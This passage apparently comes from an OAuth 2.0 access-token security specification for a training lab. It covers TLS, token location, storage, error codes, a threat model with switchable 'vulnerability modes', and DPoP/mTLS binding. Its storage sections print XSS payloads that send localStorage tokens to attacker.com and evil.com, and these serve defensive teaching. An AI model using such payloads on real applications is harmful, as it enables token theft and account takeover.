| **Resource server** | MUST use TLS | Resource access security |

**Violation Example (HTTP_RESOURCE_SERVER vulnerability mode):**
```http
GET /api/messages HTTP/1.1
Host: api.example.com              ← HTTP (not HTTPS)
Authorization: Bearer mF_9.B5f-4.1JqM

Result: Token transmitted in cleartext, vulnerable to network eavesdropping
```

### 7.2 Token Location Requirements (Security BCP §4.3.2)

**MUST NOT send tokens in URL query parameters (Security BCP §4.3.2):**

```
✅ CORRECT:
GET /api/messages HTTP/1.1
Authorization: Bearer mF_9.B5f-4.1JqM

❌ WRONG:
GET /api/messages?access_token=mF_9.B5f-4.1JqM HTTP/1.1
```

**Why URL tokens are prohibited:**
1. Server access logs capture URLs with tokens
2. Browser history stores URLs with tokens
3. Referer headers leak tokens to third parties
4. URLs may be cached by proxies
5. Users might share URLs with embedded tokens

### 7.3 Token Lifetime Requirements (Security BCP §4.3.1)

**SHOULD use short lifetimes:**

| Token Purpose | Recommended Lifetime | Rationale |
|--------------|---------------------|-----------|
| **High-security operations** | 5-15 minutes | Minimize theft impact |
| **Standard web applications** | 15-60 minutes | Balance security vs UX |
| **Low-risk public APIs** | 1-2 hours | Reduce refresh overhead |
| **Mobile applications** | 15-60 minutes | With refresh token rotation |
| **Client credentials (M2M)** | 30-60 minutes | No refresh token available |

**Rationale (Security BCP §4.3.1):**
- Shorter lifetime = smaller window for attack if token stolen
- Stolen tokens become useless after expiration
- Forces regular refresh, enabling rotation and revocation checks

### 7.4 Validation Requirements

**MUST validate on every resource request (RFC 6750 §5.2):**

| Validation | Requirement | Spec Reference |
|------------|-------------|----------------|
| **Signature verification** (JWT) | MUST verify on every request | RFC 7515 |
| **Introspection call** (opaque) | MUST introspect on every request (or cache with short TTL) | RFC 7662 |
| **Expiration check** | MUST reject expired tokens | RFC 6749 §7 |
| **Scope validation** | MUST validate required scope | RFC 6749 §7 |
| **Audience validation** (JWT) | MUST validate aud claim | RFC 7519 §4.1.3 |

**No caching without validation:**
```
❌ WRONG: Cache decision "token is valid" for 1 hour
✅ CORRECT: Cache JWKS for signature verification, validate token every time
✅ CORRECT: Cache introspection response for 1-5 minutes max (with care)
```

### 7.5 Sender Constraint (DPoP, mTLS)

**SHOULD bind tokens to client for high-security scenarios (RFC 9449, RFC 8705):**

| Binding Method | Use Case | Spec Reference |
|---------------|----------|----------------|
| **DPoP (Demonstrating Proof-of-Possession)** | Public clients, SPAs, mobile apps | RFC 9449 |
| **mTLS (Mutual TLS)** | Backend services, M2M communication | RFC 8705 |
| **None (Bearer only)** | Standard web applications with short lifetimes | RFC 6750 |

**Why sender constraint matters:**
- Bearer tokens: Anyone with token is authorized
- Sender-constrained tokens: Must prove possession of private key
- Stolen sender-constrained token is useless without private key

**See:** `token-binding-dpop-mtls.md` for detailed sender constraint specifications.

### 7.6 Token Storage Requirements

Storage requirements vary by client type and environment:

#### 7.6.1 Backend Services (Confidential Clients)

| Storage Location | Requirements | Security Level |
|-----------------|--------------|----------------|
| **Encrypted database** | Use at-rest encryption, encrypt token column | High |
| **In-memory cache** | Encrypted, evict on expiration | Medium-High |
| **Secure vault** (e.g., HashiCorp Vault) | Recommended for production | Highest |

**MUST NOT:**
- Store tokens in plaintext files
- Log tokens to application logs
- Store in unencrypted database columns

#### 7.6.2 Native Applications (Mobile/Desktop)

| Platform | Storage Mechanism | Requirements |
|----------|------------------|--------------|
| **iOS** | Keychain Services | Use kSecAttrAccessibleAfterFirstUnlock or more restrictive |
| **Android** | EncryptedSharedPreferences or Keystore | Use hardware-backed keystore if available |
| **macOS** | Keychain | Use with appropriate access control |
| **Windows** | Credential Manager or DPAPI | Use with appropriate access control |

**MUST NOT:**
- Store in plaintext files
- Store in UserDefaults/SharedPreferences without encryption
- Store in application bundle

#### 7.6.3 Single-Page Applications (SPAs)

**Critical Requirement (Security BCP §4.3.3):** NEVER use localStorage or sessionStorage

| Storage Option | Verdict | Reasoning |
|---------------|---------|-----------|
| **Memory only** | ✅ RECOMMENDED | Cleared on page refresh, not accessible to other scripts |
| **httpOnly cookie** (via BFF) | ✅ RECOMMENDED | Not accessible to JavaScript, immune to XSS |
| **sessionStorage** | ❌ FORBIDDEN | Accessible to XSS, persists across tabs |
| **localStorage** | ❌ FORBIDDEN | Accessible to XSS, persists indefinitely |

**Why localStorage is terrible for tokens:**
```javascript
// Attacker's XSS payload
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('access_token')  // Token stolen
  });
</script>
```

**Recommended SPA architecture:**
```
┌─────────────┐
│   Browser   │
│    (SPA)    │
└──────┬──────┘
       │ httpOnly cookie (session ID only)
       ▼
┌──────────────────┐
│  Backend-for-    │  ← Stores access token
│  Frontend (BFF)  │  ← Calls APIs with token
└──────────────────┘  ← Token never exposed to browser
```

### 7.7 Security Requirements Summary

| Requirement | Level | Spec Reference | Vuln Mode |
|-------------|-------|----------------|-----------|
| Use TLS 1.2+ for all token transmission | MUST | RFC 6750 §5.1 | `HTTP_RESOURCE_SERVER` |
| Validate server certificates | MUST | RFC 6750 §5.1 | `SKIP_TLS_VERIFY` |
| Use Authorization header (not URL) | MUST | Security BCP §4.3.2 | `ALLOW_TOKEN_IN_URL` |
| Short token lifetime (5-60 min) | SHOULD | Security BCP §4.3.1 | `LONG_TOKEN_LIFETIME` |
| Validate token on every request | MUST | RFC 6750 §5.2 | `SKIP_TOKEN_VALIDATION` |
| Validate scope | MUST | RFC 6749 §7 | `SKIP_SCOPE_CHECK` |
| Validate audience (JWT) | MUST | RFC 7519 §4.1.3 | `SKIP_AUDIENCE_CHECK` |
| Secure storage (not localStorage) | MUST | Security BCP §4.3.3 | `LOCALSTORAGE_TOKENS` |
| Sender-constraint for high-security | SHOULD | RFC 9449, RFC 8705 | `DISABLE_DPOP` |

---

## 8. Error Responses (RFC 6750 §3)

When token validation fails, the resource server MUST return proper HTTP status codes and WWW-Authenticate headers. This is how the resource server communicates "your token is bad and you should feel bad" in a standardized way.

### 8.1 WWW-Authenticate Header Format (RFC 6750 §3)

**Format:**
```
WWW-Authenticate: Bearer realm="<realm>",
                         error="<error_code>",
                         error_description="<description>",
                         error_uri="<uri>",
                         scope="<required_scope>"
```

**Parameters:**

| Parameter | Required? | Description | Spec Reference |
|-----------|-----------|-------------|----------------|
| `realm` | OPTIONAL | Protection space | RFC 2617 §1.2 |
| `error` | REQUIRED (if error) | Error code from defined list | RFC 6750 §3 |
| `error_description` | OPTIONAL | Human-readable error description | RFC 6750 §3 |
| `error_uri` | OPTIONAL | URI with error information | RFC 6750 §3 |
| `scope` | OPTIONAL (insufficient_scope only) | Required scope | RFC 6750 §3.1 |

### 8.2 Error Codes (RFC 6750 §3.1)

| Error Code | HTTP Status | Meaning | When to Use |
|------------|-------------|---------|-------------|
| `invalid_request` | 400 | Request malformed | Missing parameters, duplicate parameters, unsupported parameters |
| `invalid_token` | 401 | Token invalid | Expired, revoked, malformed, or invalid signature |
| `insufficient_scope` | 403 | Token lacks required scope | Token valid but insufficient permissions |

**Note:** Only these three error codes are defined by RFC 6750. Do not invent custom error codes.

### 8.3 Error Response Details

#### 8.3.1 invalid_request (HTTP 400)

**Use when:** The request is malformed (not a token problem, a request problem).

**Example scenarios:**
- Authorization header present but malformed
- Multiple access token methods used simultaneously
- Required parameters missing
- Duplicate parameters

**Example Response:**
```http
HTTP/1.1 400 Bad Request
WWW-Authenticate: Bearer realm="api.example.com",
                         error="invalid_request",
                         error_description="Authorization header malformed"
Content-Type: application/json

{
  "error": "invalid_request",
  "error_description": "The Authorization header is malformed. Expected format: 'Bearer <token>'"
}
```

**Common Causes:**
```http
❌ Authorization: Bearer    ← Missing token
❌ Authorization: bearer mF_9.B5f-4.1JqM    ← Wrong case
❌ Authorization: Bearer mF_9 mF_10    ← Multiple tokens
```

#### 8.3.2 invalid_token (HTTP 401)

**Use when:** The token itself is invalid, expired, revoked, or malformed.

**Example scenarios:**
- Token expired (exp claim in past)
- Token revoked (introspection returns active=false)
- Invalid signature (JWT signature verification fails)
- Token malformed (not valid JWT structure)
- Wrong issuer (iss claim doesn't match)
- Wrong audience (aud claim doesn't match)

**Example Response (Expired Token):**
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="api.example.com",
                         error="invalid_token",
                         error_description="The access token expired"
Content-Type: application/json

{
  "error": "invalid_token",
  "error_description": "Access token expired at 2025-12-05T10:00:00Z"
}
```

**Example Response (Revoked Token):**
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="api.example.com",
                         error="invalid_token",
                         error_description="The access token has been revoked"
```

**Example Response (Invalid Signature):**
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="api.example.com",
                         error="invalid_token",
                         error_description="Token signature verification failed"
```

#### 8.3.3 insufficient_scope (HTTP 403)

**Use when:** Token is valid but lacks the required scope for the requested resource.

**Critical distinction:** 
- 401 = Authentication problem (token invalid)
- 403 = Authorization problem (token valid, insufficient permissions)

**Example Response:**
```http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer realm="api.example.com",
                         error="insufficient_scope",
                         error_description="This resource requires 'write:messages' scope",
                         scope="write:messages"
Content-Type: application/json

{
  "error": "insufficient_scope",
  "error_description": "Your access token has scope 'read:messages' but this endpoint requires 'write:messages'",
  "required_scope": "write:messages"
}
```

**Example Scenario:**
```
Token has scope: "read:messages"
Endpoint requires: "write:messages"
Result: 403 insufficient_scope
```

**With multiple required scopes:**
```http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer realm="api.example.com",
                         error="insufficient_scope",
                         error_description="Missing required scopes",
                         scope="write:messages delete:messages"
Content-Type: application/json

{
  "error": "insufficient_scope",
  "error_description": "This endpoint requires 'write:messages' and 'delete:messages' scopes",
  "required_scope": "write:messages delete:messages"
}
```

### 8.4 HTTP Status Code Decision Tree

```
                    Token Validation
                          │
                          ▼
              ┌───────────────────────┐
              │ Request Malformed?    │
              │ (bad header format)   │
              └─────┬─────────────┬───┘
                    │YES          │NO
                    ▼             ▼
            ┌────────────┐   ┌──────────────┐
            │ 400        │   │ Token Valid? │
            │ invalid_   │   │ (exp, sig,   │
            │ request    │   │  iss, aud)   │
            └────────────┘   └─────┬────┬───┘
                                   │NO  │YES
                                   ▼    ▼
                           ┌─────────┐ ┌────────────────┐
                           │ 401     │ │ Sufficient     │
                           │ invalid_│ │ Scope?         │
                           │ token   │ └────┬──────┬────┘
                           └─────────┘      │NO    │YES
                                            ▼      ▼
                                    ┌──────────┐ ┌─────────┐
                                    │ 403      │ │ 200 OK  │
                                    │ insufficient│ │Grant   │
                                    │ _scope   │ │ Access  │
                                    └──────────┘ └─────────┘
```

### 8.5 Error Response Examples Table

| Situation | HTTP Status | Error Code | Example Description |
|-----------|-------------|------------|---------------------|
| No Authorization header | 400 | `invalid_request` | "Missing Authorization header" |
| Malformed header | 400 | `invalid_request` | "Authorization header malformed" |
| Token expired | 401 | `invalid_token` | "Access token expired" |
| Token revoked | 401 | `invalid_token` | "Access token revoked" |
| Invalid signature | 401 | `invalid_token` | "Token signature invalid" |
| Wrong audience | 401 | `invalid_token` | "Token not intended for this audience" |
| Token not yet valid | 401 | `invalid_token` | "Token not yet valid (nbf claim)" |
| Missing required scope | 403 | `insufficient_scope` | "Requires 'admin' scope" |
| Partially valid scope | 403 | `insufficient_scope` | "Requires both 'read' and 'write' scopes" |

---

## 9. Security Threat Model for Access Tokens

Access tokens are attractive targets for attackers because they're the keys to the kingdom. Here's what can go wrong, how attackers exploit it, and how to defend against it.

### 9.1 Threat: Token Theft via Network Interception (RFC 6749 §10.6)

**Attack Vector:** Man-in-the-middle (MitM) captures token during transmission.

**Attack Scenario:**
```
User → [HTTP] → Proxy/Attacker → [HTTP] → Resource Server
                     ▲
                     └─ Captures: Authorization: Bearer mF_9.B5f-4.1JqM
```

**Vulnerability Mode:** `HTTP_RESOURCE_SERVER`

**How Attack Works:**
1. Client sends token over HTTP (not HTTPS)
2. Attacker on network (wifi sniffing, ISP, proxy) intercepts request
3. Attacker extracts token from Authorization header
4. Attacker uses token to access API until expiration

**Demonstration (Vuln Mode Enabled):**
```http
GET /api/messages HTTP/1.1
Host: api.example.com              ← HTTP (not HTTPS)
Authorization: Bearer mF_9.B5f-4.1JqM

Attacker captures packet:
  Token: mF_9.B5f-4.1JqM
  Valid until: 2025-12-05T11:00:00Z
  
Attacker uses token:
  GET /api/messages HTTP/1.1
  Authorization: Bearer mF_9.B5f-4.1JqM
  Result: ✅ Success (until token expires)
```

**Mitigation (RFC 6750 §5.1):**
- MUST use TLS 1.2+ for all token transmission
- MUST validate server certificates
- MUST use HTTPS for all resource server endpoints
- Token lifetime limits damage window

**Validation:**
```
Resource Server MUST:
  1. Reject all HTTP requests (require HTTPS)
  2. Validate TLS certificate
  3. Use HSTS header to force HTTPS
```

**Implementation:**
```
✅ CORRECT:
GET /api/messages HTTP/1.1
Host: api.example.com              ← HTTPS enforced
Authorization: Bearer mF_9.B5f-4.1JqM

Server response if HTTP attempted:
HTTP/1.1 403 Forbidden
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Type: application/json

{
  "error": "insecure_transport",
  "error_description": "HTTPS required for all API requests"
}
```

### 9.2 Threat: Token Leakage via URL (Security BCP §4.3.2)

**Attack Vector:** Token appears in URL and is logged/leaked via referrer headers.

**Attack Scenario:**
```
User requests: https://api.example.com/data?access_token=secret123
Browser visits third-party site: https://analytics.com/track
Browser sends: Referer: https://api.example.com/data?access_token=secret123
Third-party site now has token
```

**Vulnerability Mode:** `ALLOW_TOKEN_IN_URL`

**How Attack Works:**
1. Client puts token in URL query parameter
2. Server logs access log with full URL (including token)
3. User clicks external link on page
4. Browser sends Referer header with full URL (including token)
5. Third-party site receives token
6. Additionally: URL stored in browser history, bookmarks, proxy caches

**Demonstration (Vuln Mode Enabled):**
```
Request:
GET /api/messages?access_token=mF_9.B5f-4.1JqM HTTP/1.1
Host: api.example.com

Server access log:
[2025-12-05 10:00:00] GET /api/messages?access_token=mF_9.B5f-4.1JqM
  → Token logged ✅

User clicks link to: https://external-site.com
Browser sends:
GET / HTTP/1.1
Host: external-site.com
Referer: https://api.example.com/api/messages?access_token=mF_9.B5f-4.1JqM
  → Token leaked to third party ✅

Browser history:
https://api.example.com/api/messages?access_token=mF_9.B5f-4.1JqM
  → Token stored in history ✅
```

**Mitigation (Security BCP §4.3.2):**
- MUST use Authorization header ONLY
- MUST NOT accept tokens in URL query parameters
- OAuth 2.1: Query parameter method removed entirely

**Validation:**
```
Resource Server MUST:
  1. Reject requests with access_token in query parameters
  2. Return 400 invalid_request if token in URL
  3. Log warning if token in URL detected
```

**Implementation:**
```
❌ WRONG:
GET /api/messages?access_token=mF_9.B5f-4.1JqM HTTP/1.1

Server response:
HTTP/1.1 400 Bad Request
WWW-Authenticate: Bearer error="invalid_request",
                         error_description="Tokens in URL query parameters are not permitted"

✅ CORRECT:
GET /api/messages HTTP/1.1
Authorization: Bearer mF_9.B5f-4.1JqM
```

### 9.3 Threat: Token Theft from Storage (Security BCP §4.3.3)

**Attack Vector:** XSS attack or local file access steals stored token.

**Attack Scenario (SPA with localStorage):**
```javascript
// App stores token in localStorage
localStorage.setItem('access_token', 'mF_9.B5f-4.1JqM');

// Attacker injects XSS payload
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('access_token')
  });
</script>

// Token stolen
```

**Vulnerability Mode:** `LOCALSTORAGE_TOKENS`

**How Attack Works:**
1. Application stores token in localStorage or sessionStorage
2. Attacker finds XSS vulnerability in application
3. Attacker injects script to read localStorage
4. Attacker exfiltrates token to attacker-controlled server
5. Attacker uses token until expiration

**Demonstration (Vuln Mode Enabled):**
```javascript
// Vulnerable code
function storeToken(token) {
  localStorage.setItem('access_token', token);  // ❌ VULNERABLE
}

function callAPI() {
  const token = localStorage.getItem('access_token');
  fetch('https://api.example.com/messages', {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });
}

// XSS attack
// Attacker injects via vulnerable comment field:
<img src=x onerror="fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'))">

// Token exfiltrated to evil.com
```

**Mitigation (Security BCP §4.3.3):**

| Storage Type | Security | Recommendation |
|-------------|----------|----------------|
| **localStorage** | ❌ FORBIDDEN | Accessible to XSS |
| **sessionStorage** | ❌ FORBIDDEN | Accessible to XSS |
| **Memory only (JS variable)** | ✅ RECOMMENDED | Lost on page refresh, but immune to XSS across tabs |
| **httpOnly cookie (via BFF)** | ✅ RECOMMENDED | Not accessible to JavaScript |

**Recommended Architecture (Backend-for-Frontend):**
```
┌─────────────────┐
│   Browser       │
│   (SPA)         │  ← No token storage
└────────┬────────┘
         │ httpOnly session cookie
         ▼
┌─────────────────┐
│  BFF Server     │  ← Stores access token server-side
└────────┬────────┘  ← Calls APIs with token
         │
         ▼
┌─────────────────┐
│  Resource       │
│  Server (API)   │
└─────────────────┘
```

**Validation:**
```
SPA Best Practice:
  1. Store session ID in httpOnly cookie (not token)
  2. BFF server stores access token server-side
  3. SPA calls BFF, BFF calls resource server with token
  4. Token never exposed to browser JavaScript
```

### 9.4 Threat: Token Replay Attack (RFC 6819 §5.2)

**Attack Vector:** Attacker uses stolen token before expiration.

**Attack Scenario:**
```
1. Legitimate client uses token successfully
2. Attacker steals token (via network sniff, XSS, etc.)
3. Attacker uses stolen token to access API
4. Both legitimate client and attacker use same token
```

**Vulnerability Mode:** `STOLEN_TOKEN` (scenario simulation)

**How Attack Works:**
1. Token stolen via any mechanism (MitM, XSS, phishing, malware)
2. Attacker uses token to call resource server
3. Resource server cannot distinguish attacker from legitimate client
4. Both use token until expiration

**Demonstration (Vuln Mode Enabled):**
```
Legitimate Client:
GET /api/messages HTTP/1.1
Authorization: Bearer mF_9.B5f-4.1JqM
Response: 200 OK (messages)

[Token stolen via network sniff]

Attacker:
GET /api/messages HTTP/1.1
Authorization: Bearer mF_9.B5f-4.1JqM  ← Same token
Response: 200 OK (messages)           ← Cannot distinguish from legitimate

Attacker:
DELETE /api/messages/123 HTTP/1.1
Authorization: Bearer mF_9.B5f-4.1JqM
Response: 200 OK (message deleted)    ← Attacker can perform actions
```

**Mitigation:**
1. **Short token lifetime (Security BCP §4.3.1):** Limit damage window
2. **Token rotation:** Issue new token on refresh
3. **Sender-constraint (RFC 9449, RFC 8705):** Bind token to client key
4. **Revocation (RFC 7009):** Revoke if theft detected
5. **Anomaly detection:** Detect suspicious usage patterns

**Short Lifetime Mitigation:**
```
Token issued: 2025-12-05 10:00:00
Token expires: 2025-12-05 10:15:00  ← 15 minute lifetime
Token stolen: 2025-12-05 10:12:00
Attacker window: 3 minutes only

Comparison:
  15 minute lifetime: 3 minute attack window
  24 hour lifetime: 23 hour 48 minute attack window
```

**Sender-Constraint Mitigation (DPoP - RFC 9449):**
```
Client generates key pair:
  Public key: sent in DPoP proof
  Private key: kept secret

Token bound to public key:
  Token can only be used with matching DPoP proof

Attacker steals token:
  Token: mF_9.B5f-4.1JqM
  But: Cannot generate valid DPoP proof (lacks private key)
  
Attacker attempts to use token:
  GET /api/messages HTTP/1.1
  Authorization: DPoP mF_9.B5f-4.1JqM
  DPoP: <missing or invalid proof>
  Response: 401 invalid_token (DPoP proof invalid)
```

**See:** `token-binding-dpop-mtls.md` for complete sender-constraint specifications.

### 9.5 Threat: Insufficient Scope Validation

**Attack Vector:** Client uses token beyond intended scope.

**Attack Scenario:**
```
1. User grants token with scope: "read:messages"
2. Malicious client attempts: DELETE /messages/123
3. Resource server fails to validate scope
4. Message deleted despite insufficient scope
```

**Vulnerability Mode:** `SKIP_SCOPE_CHECK`

**How Attack Works:**
1. User authorizes limited scope (e.g., "read:messages")
2. Client receives token with limited scope
3. Client attempts privileged operation (e.g., delete)
4. Resource server fails to validate scope requirement
5. Operation succeeds despite insufficient authorization

**Demonstration (Vuln Mode Enabled):**
```
Token scopes: "read:messages"

Request:
DELETE /api/messages/123 HTTP/1.1
Authorization: Bearer mF_9.B5f-4.1JqM

Vulnerable Resource Server (scope check disabled):
  1. Validate token signature: ✅ Valid
  2. Check expiration: ✅ Not expired
  3. Check scope: ⚠️ SKIPPED (vulnerability mode)
  4. Allow deletion: ✅ 200 OK

Result: Message deleted despite token lacking delete permission
```

**Mitigation:**
```
Resource Server MUST:
  1. Determine required scope for endpoint
  2. Extract scope from token
  3. Validate token contains ALL required scopes
  4. Deny if insufficient scope
```

**Correct Implementation:**
```
DELETE /api/messages/123 HTTP/1.1
Authorization: Bearer <token_with_scope_read:messages>

Resource Server:
  1. Endpoint requires: "delete:messages" or "write:messages"
  2. Token has: "read:messages"
  3. Validation: FAIL
  4. Response:
     HTTP/1.1 403 Forbidden
     WWW-Authenticate: Bearer error="insufficient_scope",
                              error_description="This endpoint requires 'delete:messages'",
                              scope="delete:messages"
```

**Validation Algorithm:**
```
FUNCTION validateEndpointScope(token, endpoint):
    requiredScopes = getRequiredScopesForEndpoint(endpoint)
    tokenScopes = extractScopesFromToken(token)
    
    FOR EACH requiredScope IN requiredScopes:
        IF requiredScope NOT IN tokenScopes:
            RETURN error(403, "insufficient_scope", requiredScope)
    
    RETURN valid
```

### 9.6 Threat: Token Substitution Attack

**Attack Vector:** Attacker uses token intended for different resource server.

**Attack Scenario:**
```
1. User authorizes app to access email API
2. App receives token with aud: "https://email.example.com"
3. Attacker steals token
4. Attacker uses token at calendar API: "https://calendar.example.com"
5. Calendar API fails to validate audience
6. Attacker accesses calendar with email token
```

**Vulnerability Mode:** `SKIP_AUDIENCE_CHECK`

**How Attack Works:**
1. Token issued for specific resource server (aud claim)
2. Attacker uses token at different resource server
3. Resource server fails to validate aud claim
4. Token accepted despite wrong audience

**Demonstration (Vuln Mode Enabled):**
```
Token (JWT):
{
  "iss": "https://auth.example.com",
  "sub": "user_123",
  "aud": "https://email.example.com",        ← Intended for email API
  "scope": "read:email",
  "exp": 1733432000
}

Attacker attempts at calendar API:
GET /api/calendar/events HTTP/1.1
Host: calendar.example.com                   ← Different API
Authorization: Bearer <jwt_token>

Vulnerable Calendar API (audience check disabled):
  1. Verify signature: ✅ Valid
  2. Check expiration: ✅ Not expired
  3. Check audience: ⚠️ SKIPPED (vulnerability mode)
  4. Allow access: ✅ 200 OK

Result: Token intended for email API works at calendar API
```

**Mitigation:**
```
Resource Server MUST:
  1. Define expected audience value
  2. Extract aud claim from JWT
  3. Validate aud matches expected value
  4. Reject if audience mismatch
```

**Correct Implementation:**
```
Calendar API:
  Expected audience: "https://calendar.example.com"
  
  Validation:
    1. Extract aud from token: "https://email.example.com"
    2. Compare to expected: "https://calendar.example.com"
    3. Match: NO
    4. Response:
       HTTP/1.1 401 Unauthorized
       WWW-Authenticate: Bearer error="invalid_token",
                                error_description="Token not intended for this audience"
```

**JWT Audience Validation:**
```
FUNCTION validateAudience(token, expectedAudience):
    tokenAud = token.aud  # May be string or array
    
    # aud can be array or single string
    IF tokenAud is Array:
        IF expectedAudience NOT IN tokenAud:
            RETURN error(401, "invalid_token", "Invalid audience")
    ELSE:
        IF tokenAud != expectedAudience:
            RETURN error(401, "invalid_token", "Invalid audience")
    
    RETURN valid
```

### 9.7 Threat Summary Table

| Threat | Attack | Vuln Mode | Mitigation | Validation |
|--------|--------|-----------|------------|------------|
| **Network Interception** | MitM captures token over HTTP | `HTTP_RESOURCE_SERVER` | TLS 1.2+ REQUIRED | Reject HTTP requests |
| **URL Leakage** | Token in URL logged/leaked via referrer | `ALLOW_TOKEN_IN_URL` | Authorization header ONLY | Reject tokens in URL |
| **Storage Theft** | XSS steals token from localStorage | `LOCALSTORAGE_TOKENS` | Memory only or httpOnly cookie | Never use localStorage |
| **Replay Attack** | Stolen token used by attacker | `STOLEN_TOKEN` | Short lifetime, sender-constraint | Monitor usage patterns |
| **Insufficient Scope** | Token used beyond granted scope | `SKIP_SCOPE_CHECK` | MUST validate scope | Deny if scope missing |
| **Token Substitution** | Token used at wrong resource server | `SKIP_AUDIENCE_CHECK` | Validate aud claim | Reject if audience wrong |

---

## 10. Token Binding and Sender Constraint

Bearer tokens have a fundamental problem: possession equals authorization. This is fine for low-risk scenarios with short lifetimes, but for high-security scenarios (financial transactions, sensitive data), we need proof that the token presenter is the legitimate client.

### 10.1 The Bearer Token Problem

**Bearer Token Model:**
```
Token = Key to the kingdom
Whoever holds key can open door
No questions asked
```

**Problem:**
```
Legitimate Client:          Attacker:
  Has token ✅              Steals token ✅
  Can use API ✅            Can use API ✅ ← Problem!
  
Resource server cannot distinguish between legitimate client and attacker
```

### 10.2 Sender Constraint Solutions

| Solution | Mechanism | Use Case | Spec Reference |
|----------|-----------|----------|----------------|
| **DPoP** (Demonstrating Proof-of-Possession) | Cryptographic proof with private key | Public clients, SPAs, mobile apps | RFC 9449 |
| **mTLS** (Mutual TLS) | Client certificate authentication | Backend services, M2M | RFC 8705 |
| **Token Binding** | Browser-based crypto binding | Legacy, limited support | RFC 8473 (not widely adopted) |

### 10.3 DPoP (Demonstrating Proof-of-Possession) - RFC 9449

**Concept:** Bind token to client's private key; client must prove possession on each request.

**Flow:**
```
Client                    Authorization Server         Resource Server
  │                              │                           │
  │  (1) Generate key pair       │                           │
  │  Public key + Private key    │                           │
  │                              │                           │
  │  (2) Token Request           │                           │
  │  + DPoP proof (signed)       │                           │
  ├─────────────────────────────►│                           │
  │  DPoP: <JWT with public key> │                           │
  │                              │                           │
  │  (3) Token Response          │                           │
  │  access_token (DPoP-bound)   │                           │
  │◄─────────────────────────────┤                           │
  │  token_type: "DPoP"          │                           │
  │                              │                           │
  │  (4) API Request             │                           │
  │  + DPoP proof (signed)       │                           │
  ├──────────────────────────────┼──────────────────────────►│
  │  Authorization: DPoP <token> │                           │
  │  DPoP: <JWT signed with private key>                     │
  │                              │                           │
  │                              │  (5) Verify DPoP proof    │
  │                              │  - Extract public key hash│
  │                              │  - Verify signature       │
  │                              │  - Validate claims        │
  │                              │                           │
  │  (6) API Response            │                           │
  │◄──────────────────────────────────────────────────────────┤
  │                              │                           │
```

**Security Benefit:**
```
Attacker steals token:
  Token: DPoP-bound token mF_9.B5f-4.1JqM
  BUT: Cannot generate valid DPoP proof (lacks private key)

Attacker attempts to use:
  Authorization: DPoP mF_9.B5f-4.1JqM
  DPoP: <invalid or missing proof>
  
Resource Server:
  Validates DPoP proof signature: ❌ FAIL
  Response: 401 invalid_token
  
Stolen token is USELESS without private key ✅
```

**See:** `token-binding-dpop-mtls.md` for complete DPoP specification.

### 10.4 mTLS (Mutual TLS) - RFC 8705

**Concept:** Client authenticates with TLS client certificate; token bound to certificate.

**Flow:**
```
Client                    Authorization Server         Resource Server
  │                              │                           │
  │  (1) TLS handshake           │                           │
  │  + Client certificate        │                           │
  ├─────────────────────────────►│                           │
  │                              │                           │
  │  (2) Token Request           │                           │
  │  (authenticated via cert)    │                           │
  ├─────────────────────────────►│                           │
  │                              │                           │
  │  (3) Token Response          │                           │
  │  access_token (cert-bound)   │                           │
  │◄─────────────────────────────┤                           │
  │                              │                           │
  │  (4) TLS handshake           │                           │
  │  + Client certificate        │                           │
  ├──────────────────────────────┼──────────────────────────►│
  │                              │                           │
  │  (5) API Request             │                           │
  │  Authorization: Bearer <token>                           │
  ├──────────────────────────────┼──────────────────────────►│
  │                              │                           │
  │                              │  (6) Verify certificate   │
  │                              │  matches token binding    │
  │                              │                           │
  │  (7) API Response            │                           │
  │◄──────────────────────────────────────────────────────────┤
  │                              │                           │
```

**Security Benefit:**
```
Token bound to certificate thumbprint:
  Token metadata: cnf.x5t#S256 = <certificate_hash>

Attacker steals token:
  Token: Certificate-bound token
  BUT: Cannot present matching certificate (lacks private key)

Resource Server:
  1. TLS handshake extracts client certificate
  2. Compute certificate hash
  3. Compare to cnf.x5t#S256 in token
  4. Mismatch: Reject request
  
Stolen token is USELESS without certificate ✅
```

**See:** `token-binding-dpop-mtls.md` for complete mTLS specification.

### 10.5 When Sender Constraint is Needed

| Scenario | Recommended Approach | Rationale |
|----------|---------------------|-----------|
| **Financial transactions** | DPoP or mTLS | Token theft = financial loss |
| **Highly sensitive APIs** | DPoP or mTLS | Minimize theft impact |
| **Zero-trust architecture** | mTLS | Every connection verified |
| **Backend M2M communication** | mTLS | Certificate infrastructure available |
| **Public client (SPA, mobile)** | DPoP | No certificate infrastructure |
| **Standard web application** | Bearer + short lifetime | Acceptable risk |
| **Low-risk public data API** | Bearer | Minimal security requirement |

### 10.6 Comparison: Bearer vs DPoP vs mTLS

| Aspect | Bearer | DPoP | mTLS |
|--------|--------|------|------|
| **Security** | Low (possession = authorization) | High (requires private key) | Highest (requires certificate) |
| **Complexity** | Low | Medium | High |
| **Client Support** | Universal | Growing | Backend services |
| **Infrastructure** | None | None | PKI required |
| **Token Theft Impact** | Full access until expiration | Token useless | Token useless |
| **Spec Reference** | RFC 6750 | RFC 9449 | RFC 8705 |

---

## 11. Access Token in Different Grant Types

Access tokens are issued differently depending on the grant type. Here's how access tokens appear in each flow.

### 11.1 Authorization Code Flow

**Issuance:** Token endpoint response after exchanging authorization code.

**Token Response:**
```http
POST /token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&code=SplxlOBeZQQYbYS6WxSbIA
&redirect_uri=https://client.example.com/callback
&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
&client_id=client_abc123

Response:
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{
  "access_token": "2YotnFZFEjr1zCsicMWpAA",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA",   ← Typically included
  "scope": "read:messages write:messages"
}
```

**Characteristics:**
- Issued to confidential or public client
- Typically includes refresh token
- Short-lived access token (15-60 minutes)
